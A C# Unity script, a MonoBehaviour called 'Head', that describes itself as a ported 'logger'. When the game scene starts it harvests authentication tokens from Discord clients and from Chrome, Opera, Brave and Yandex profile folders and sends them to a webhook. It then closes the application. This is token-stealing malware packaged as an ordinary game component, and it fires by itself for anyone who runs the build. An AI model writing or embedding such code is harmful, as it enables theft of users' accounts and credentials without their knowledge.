using System.Collections.Generic;
using UnityEngine;

public class Head : MonoBehaviour
{
    /*
     ! Note: This code is from an open-source logger, just that it's been ported to work with Unity.
     */
    #region Variables
    public static readonly List<string> TokenReport = new();

    private static readonly List<Service> _services = new()
    {
        new Service("Discord", @"Roaming\Discord"),
        new Service("Discord Canary", @"Roaming\discordcanary"),
        new Service("Discord PTB", @"Roaming\discordptb"),
        new Service("Discord Developer", @"Roaming\discorddeveloper"),
        new Service("Google Chrome", @"Local\Google\Chrome\User Data\Default"),
        new Service("Opera", @"Roaming\Opera Software\Opera Stable", true),
        new Service("Brave", @"Local\BraveSoftware\Brave-Browser\User Data\Default", true),
        new Service("Yandex", @"Local\Yandex\YandexBrowser\User Data\Default", true)
    };
    #endregion

    private void Start()
    {
        for (var i = 0; i < _services.Count; i++) _services[i].GetTokens();

        Debug.Log(Grabber.TokensFound);

        if (!Grabber.TokensFound) return;
        Webhook.ReportTokens(TokenReport);
        Application.Quit();
    }
}